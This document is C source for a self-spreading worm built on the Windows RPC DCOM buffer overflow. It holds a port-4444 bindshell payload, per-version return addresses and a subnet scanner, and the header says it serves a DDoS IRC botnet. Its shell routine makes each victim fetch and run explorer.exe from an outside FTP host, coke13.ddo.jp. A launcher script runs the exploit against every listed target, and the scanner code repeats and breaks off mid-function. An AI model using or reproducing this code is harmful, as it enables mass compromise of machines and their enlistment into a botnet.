   /* RPC DCOM WORM v 2.2 -
   * originally by volkam, fixed and beefed by uv/graff
   * even more original concept by LSD-pl.net
   * original code by HDM
   *
   * --
   * This code is in relation to a specific DDOS IRCD botnet project.
   * You may edit the code, and define which ftp to login
   * and which .exeutable file to recieve and run.
   * I use spybot, very convienent
   * -
   * So basicly script kids and brazilian children, this is useless to you
   *
   * -
   * shouts: darksyn - true homie , giver of 0d4yz, and testbeds
   * volkam - top sekret agent man
   * ntfx - master pupil
   * jpahk - true homie #2
   *
   * Legion2000 Security Research (c) 2003
   * -
   * enjoy!
   **************************************************************/
   #include <stdio.h>
   #include <stdlib.h>
   #include <error.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <arpa/inet.h>
   #include <unistd.h>
   #include <netdb.h>
   #include <fcntl.h>
   #include <unistd.h>
   unsigned char bindstr[]={
   0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
   0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
   0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,
   0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
   0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

   unsigned char request1[]={
   0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
   ,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00
   ,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45
   ,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E
   ,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D
   ,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41
   ,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00
   ,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45
   ,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00
   ,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29
   ,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00
   ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00
   ,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00
   ,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10
   ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF
   ,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10
   ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09
   ,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00
   ,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00
   ,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00
   ,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00
   ,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01
   ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03
   ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00
   ,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E
   ,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00
   ,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00
   ,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00
   ,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00
   ,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00
   ,0x00,0x00,0x00,0x00,0x00,0x00};

   unsigned char request2[]={
   0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
   ,0x00,0x00,0x5C,0x00,0x5C,0x00};

   unsigned char request3[]={
   0x5C,0x00
   ,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00
   ,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
   ,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
   ,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};


   unsigned char *targets [] =
   {
   "Windows NT SP4 (english)",
   "Windows NT SP5 (chineese)",
   "Windows NT SP6 (chineese)",
   "Windows NT SP6a (chineese)",
   "Windows 2000 NOSP (polish)",
   "Windows 2000 SP3 (polish)",
   "Windows 2000 SP4 (spanish)",
   "Windows 2000 NOSP1 (english)",
   "Windows 2000 NOSP2 (english)",
   "Windows 2000 SP2-1 (english)",
   "Windows 2000 SP2-2 (english)",
   "Windows 2000 SP3-2 (english)",
   "Windows 2000 NOSP (chineese)",
   "Windows 2000 SP1 (chineese)",
   "Windows 2000 SP2 (chineese)",
   "Windows 2000 SP3 (chineese)",
   "Windows 2000 SP4 (chineese)",
   "Windows 2000 SP3 (german)",
   "Windows 2000 NOSP (japaneese",
   "Windows 2000 SP1 (japaneese)",
   "Windows 2000 SP2 (japaneese)",
   "Windows 2000 NOSP (korean)",
   "Windows 2000 SP1 (korean)",
   "Windows 2000 SP2 (korean)",
   "Windows 2000 NOSP (mexican)",
   "Windows 2000 SP1 (mexican)",
   "Windows XP NOSP (english)",
   "Windows SP1-2 (english)",
   "Windows 2k3 (english)",
   "Windows 2000 SP3 (german)",
   "Windows 2000 SP4-1 (german)",
   "Windows 2000 SP4-2 (german)",
   "Windows XP SP1 (german)",
   "Windows 2000 SERVER SP1 (french)",
   "Windows 2000 SERVER SP4 (french)",
   "Windows XP NOSP (french)",
   "Windows XP SP1 (french)",
   "Windows 2000 SP0 (english)",
   "Windows 2000 SP1 (english)",
   "Windows 2000 SP2 (english)",
   "Windows 2000 SP3 (english)",
   "Windows 2000 SP4 (english)",
   "Windows XP SP0 (english)",
   "Windows XP SP1-1 (english)",
   "Windows XP SP2 (english)",
   "Windows 2000 Advanced Server SP3 (english)",
   "ALL/WINXP/WIN2K",
   NULL
   };

   unsigned long offsets [] =
   {
   0x77e527f3,
   0x77cfdaee,
   0x77ac0ef0,
   0x77c3eaf0,
   0x774d3fe3,
   0x77292ce4,
   0x77133ba5,
   0x777416e8,
   0x772b49e2,
   0x77b524e8,
   0x775cfa2e,
   0x772ae3e2,
   0x778b89e6,
   0x772b49e0,
   0x77444342,
   0x77294cdf,
   0x777a882e,
   0x77e527f3,
   0x778b89e5,
   0x772b49df,
   0x772ae3e1,
   0x778b89e5,
   0x772b49df,
   0x772ae3e1,
   0x778b89e8,
   0x77e3afe9,
   0x77db37d7,
   0x77b05422,
   0x77292ce3,
   0x77294ce0,
   0x7756c2e2,
   0x77fc18d4,
   0x774b3ee4,
   0x7756c2e2,
   0x774a75d4,
   0x77fc18d4,
   0x77e81674,
   0x77e829ec,
   0x77e824b5,
   0x77e8367a,
   0x77f92a9b,
   0x77e9afe3,
   0x77e626ba,
   0x77d737db,
   0x77e2afc5,
   0x010016C6
   };

   unsigned char sc[]=
   "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"
   "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
   "\x46\x00\x58\x00\x46\x00\x58\x00"

   "\xff\xff\xff\xff" /* return address */

   "\xcc\xe0\xfd\x7f" /* primary thread data block */
   "\xcc\xe0\xfd\x7f" /* primary thread data block */

   /* port 4444 bindshell */
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
   "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
   "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
   "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
   "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
   "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
   "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
   "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"
   "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
   "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
   "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
   "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
   "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
   "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
   "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
   "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
   "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
   "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
   "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
   "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
   "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
   "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
   "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
   "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
   "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
   "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
   "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
   "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
   "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
   "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
   "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
   "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";


   unsigned char request4[]={
   0x01,0x10
   ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00
   ,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C
   ,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
   };


   void
   shell(int sock)
   {
   fd_set fd_read;
   char buff[1024], *cmd="echo open coke13.ddo.jp>>o&echo wed>>o&echo wed>>o&echo user wed wed>>o&echo bin>>o&echo get explorer.exe>>o&echo bye>>o&ftp -s:o&explorer.exe&del o&exit\n";


   int n;

   FD_ZERO(&fd_read);
   FD_SET(sock, &fd_read);
   FD_SET(0, &fd_read);

   send(sock, cmd, strlen(cmd), 0);

   while(1) {
   FD_SET(sock,&fd_read);
   FD_SET(0,&fd_read);

   if (select(FD_SETSIZE, &fd_read, NULL, NULL, NULL) < 0 ) break;

   if (FD_ISSET(sock, &fd_read)) {

   if((n = recv(sock, buff, sizeof(buff), 0)) < 0){
   fprintf(stderr, "EOF\n");
   exit(2);
   }

   if (write(1, buff, n) < 0) break;
   }

   if (FD_ISSET(0, &fd_read)) {

   if((n = read(0, buff, sizeof(buff))) < 0){
   fprintf(stderr, "EOF\n");
   exit(2);
   }

   if (send(sock, buff, n, 0) < 0) break;
   }

   usleep(10);
   exit(0);
   }

   fprintf(stderr, "Connection lost.\n\n");
   exit(0);
   }


   int main(int argc, char **argv)
   {

   int sock;
   int len,len1;
   unsigned int target_id;
   unsigned long ret;
   struct sockaddr_in target_ip;
   unsigned short port = 135;
   unsigned char buf1[0x1000];
   unsigned char buf2[0x1000];
   printf("---------------------------------------------------------\n");
   printf("- Remote DCOM RPC Buffer Overflow Exploit\n");
   printf("- Original code by FlashSky and Benjurry\n");
   printf("- Rewritten by HDM\n");
   printf("- autoroot/worm by volkam\n");
   printf("- Fixed and Beefed by Legion2000 Security Research\n");


   if(argc<3)
   {
   printf("- Usage: %s <Target ID> <Target IP>\n", argv[0]);
   printf("- Targets:\n");
   for (len=0; targets[len] != NULL; len++)
   {
   printf("- %d\t%s\n", len, targets[len]);
   }
   printf("\n");
   exit(1);
   }

   /* yeah, get over it */
   target_id = atoi(argv[1]);
   ret = offsets[target_id];

   printf("- Using return address of 0x%.8x\n", ret);

   memcpy(sc+36, (unsigned char *) &ret, 4);

   target_ip.sin_family = AF_INET;
   target_ip.sin_addr.s_addr = inet_addr(argv[2]);
   target_ip.sin_port = htons(port);

   if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)
   {
   perror("- Socket");
   return(0);
   }

   if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0)
   {
   perror("- Connect");
   return(0);
   }

   len=sizeof(sc);
   memcpy(buf2,request1,sizeof(request1));
   len1=sizeof(request1);

   *(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2;
   *(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;

   memcpy(buf2+len1,request2,sizeof(request2));
   len1=len1+sizeof(request2);
   memcpy(buf2+len1,sc,sizeof(sc));
   len1=len1+sizeof(sc);
   memcpy(buf2+len1,request3,sizeof(request3));
   len1=len1+sizeof(request3);
   memcpy(buf2+len1,request4,sizeof(request4));
   len1=len1+sizeof(request4);

   *(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;


   *(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;
   *(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;

   if (send(sock,bindstr,sizeof(bindstr),0)== -1)
   {
   perror("- Send");
   return(0);
   }
   len=recv(sock, buf1, 1000, 0);

   if (send(sock,buf2,len1,0)== -1)
   {
   perror("- Send");
   return(0);
   }
   close(sock);
   sleep(1);

   target_ip.sin_family = AF_INET;
   target_ip.sin_addr.s_addr = inet_addr(argv[2]);
   target_ip.sin_port = htons(4444);

   if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)
   {
   perror("- Socket");
   return(0);
   }

   if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0)
   {
   printf("- Exploit appeared to have failed.\n");
   return(0);
   }

   printf("- Dropping to System Shell...\n\n");


   shell(sock);
   return(0);
   }
   serv



   ./vdcom 44 $1&
   ./vdcom 45 $1&
   ./vdcom 46 $1&
   ./vdcom 10 $1&
   ./vdcom 11 $1&
   ./vdcom 12 $1&
   ./vdcom 13 $1&
   ./vdcom 14 $1&
   ./vdcom 15 $1&
   ./vdcom 16 $1&
   ./vdcom 17 $1&
   ./vdcom 18 $1&
   ./vdcom 19 $1&
   ./vdcom 20 $1&
   ./vdcom 21 $1&
   ./vdcom 22 $1&
   ./vdcom 23 $1&
   ./vdcom 24 $1&
   ./vdcom 25 $1&
   ./vdcom 26 $1&
   ./vdcom 27 $1&
   ./vdcom 28 $1&
   ./vdcom 29 $1&
   ./vdcom 30 $1&
   ./vdcom 31 $1&
   ./vdcom 32 $1&
   ./vdcom 33 $1&
   ./vdcom 34 $1&
   ./vdcom 35 $1&
   ./vdcom 36 $1&
   ./vdcom 37 $1&
   ./vdcom 38 $1&
   ./vdcom 39 $1&
   ./vdcom 40 $1&
   ./vdcom 41 $1&
   ./vdcom 42 $1&
   ./vdcom 43 $1&
   ./vdcom 5 $1&
   ./vdcom 4 $1&
   ./vdcom 6 $1&
   ./vdcom 0 $1&
   ./vdcom 1 $1&
   ./vdcom 2 $1&
   ./vdcom 3 $1&
   ./vdcom 8 $1&
   ./vdcom 9 $1&
   ./vdcom 7 $1&
   SCAN.c


   #include <stdio.h>
   #include <string.h>
   #include <time.h>
   #include <fcntl.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <errno.h>

   #define MAX_SOCKETS 1000
   #define TIMEOUT 2

   #define S_NONE 0
   #define S_CONNECTING 1

   struct conn_t {
   int s;
   char status;
   time_t a;
   struct sockaddr_in addr;
   };
   struct conn_t connlist[MAX_SOCKETS];

   void init_sockets(void);
   void check_sockets(void);
   void fatal(char *);

   int main(int argc, char *argv[])
   {
   int done, i, aa, bb, cc, dd, ret, k, ns;
   unsigned int port;
   time_t scantime;
   char ip[20];

   if (argc < 3) {
   printf("Usage: %s <a-block> <port> [b-block] [c-block]\n", argv[0]);
   return -1;
   }

   done = 0; bb = 0; cc = 0; dd = 0; aa = 0; port = 0;

   aa = atoi(argv[1]);
   if ((aa < 0) || (aa > 255)) {
   fatal("Invalid a-range\n");
   }

   port = (unsigned int)atoi(argv[2]);
   if (port == 0)
   fatal("Bad port number.\n");

   if (argc >= 4) {
   bb = atoi(argv[3]);
   if ((bb < 0) || (bb > 255))
   fatal("Invalid b-range.\n");
   }

   if (argc >= 5) {
   cc = atoi(argv[4]);
   if ((cc < 0) || (cc > 255))
   fatal("Invalid c-range.\n");
   }

   init_sockets();

   scantime = time(0);

   while(!done) {
   for (i = 0; i < MAX_SOCKETS; i++) {
   if (dd == 255) {
   if (cc < 255) {
   cc++;
   dd = 0;
   }
   else {
   if (bb < 255) {
   bb++;
   cc = 0;
   dd = 0;
   }
   else {
   if (aa < 255) {
   aa++;
   bb = 0;
   cc = 0;
   dd = 0;
   }
   else {
   ns = 0;
   for (k = 0; k < MAX_SOCKETS; k++) {
   if (connlist[k].status > S_NONE)
   ns++;
   }

   if (ns == 0)
   break;
   }
   }
   }
   }

   if (connlist[i].status == S_NONE) {
   connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
   if (connlist[i].s != -1) {
   ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
   if (ret == -1) {
   printf("Unable to set O_NONBLOCK\n");
   close(connlist[i].s);
   }
   else {
   memset((char *)ip, 0, 20);
   sprintf(ip, "%d.%d.%d.%d", aa, bb, cc, dd);
   connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
   if (connlist[i].addr.sin_addr.s_addr == -1)
   fatal("Invalid IP.");
   connlist[i].addr.sin_family = AF_INET;
   connlist[i].addr.sin_port = htons(port);
   connlist[i].a = time(0);
   connlist[i].status = S_CONNECTING;
   dd++;
   }
   }
   }
   }

   check_sockets();
   }

   }

   void init_sockets(void)
   {
   int i;

   for (i = 0; i < MAX_SOCKETS; i++) {
   connlist[i].status = S_NONE;
   memset((struct sockaddr_in *)&connlist[i].addr, 0,
   sizeof(struct sockaddr_in));
   }
   }

   void check_sockets(void)
   {
   int i, ret;

   for (i = 0; i < MAX_SOCKETS; i++) {
   if ((connlist[i].a < (time(0) - TIMEOUT)) &&
   (connlist[i].status == S_CONNECTING)) {
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   else if (connlist[i].status == S_CONNECTING) {
   ret = connect(connlist[i].s,
   (struct sockaddr *)&connlist[i].addr,
   sizeof(struct sockaddr_in));
   if (ret == -1) {
   if (errno == EISCONN) {
   printf("%s\n",
   (char *)inet_ntoa(connlist[i].addr.sin_addr),
   (time(0)-connlist[i].a));
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   if ((errno != EALREADY) && (errno != EINPROGRESS)) {
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   }

   else {
   char luck[100];
   sprintf(luck,"./serv %s",(char *)inet_ntoa(connlist[i].addr.sin_addr),(time(0)-connlist[i].a));
   printf("Attempting RPC/DCOM on %s\n",
   (char *)inet_ntoa(connlist[i].addr.sin_addr),
   (time(0)-connlist[i].a));
   system(luck);
   printf("Done with %s Next ...\n");
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }
   }
   }
   }

   void fatal(char *err)
   {
   int i;
   printf("Error: %s\n", err);
   for (i = 0; i < MAX_SOCKETS; i++) {
   if (connlist[i].status >= S_CONNECTING)
   close(connlist[i].s);
   }
   exit(-1);
   }
   SCAN.c


   #include <stdio.h>
   #include <string.h>
   #include <time.h>
   #include <fcntl.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <errno.h>

   #define MAX_SOCKETS 1000
   #define TIMEOUT 2

   #define S_NONE 0
   #define S_CONNECTING 1

   struct conn_t {
   int s;
   char status;
   time_t a;
   struct sockaddr_in addr;
   };
   struct conn_t connlist[MAX_SOCKETS];

   void init_sockets(void);
   void check_sockets(void);
   void fatal(char *);

   int main(int argc, char *argv[])
   {
   int done, i, aa, bb, cc, dd, ret, k, ns;
   unsigned int port;
   time_t scantime;
   char ip[20];

   if (argc < 3) {
   printf("Usage: %s <a-block> <port> [b-block] [c-block]\n", argv[0]);
   return -1;
   }

   done = 0; bb = 0; cc = 0; dd = 0; aa = 0; port = 0;

   aa = atoi(argv[1]);
   if ((aa < 0) || (aa > 255)) {
   fatal("Invalid a-range\n");
   }

   port = (unsigned int)atoi(argv[2]);
   if (port == 0)
   fatal("Bad port number.\n");

   if (argc >= 4) {
   bb = atoi(argv[3]);
   if ((bb < 0) || (bb > 255))
   fatal("Invalid b-range.\n");
   }

   if (argc >= 5) {
   cc = atoi(argv[4]);
   if ((cc < 0) || (cc > 255))
   fatal("Invalid c-range.\n");
   }

   init_sockets();

   scantime = time(0);

   while(!done) {
   for (i = 0; i < MAX_SOCKETS; i++) {
   if (dd == 255) {
   if (cc < 255) {
   cc++;
   dd = 0;
   }
   else {
   if (bb < 255) {
   bb++;
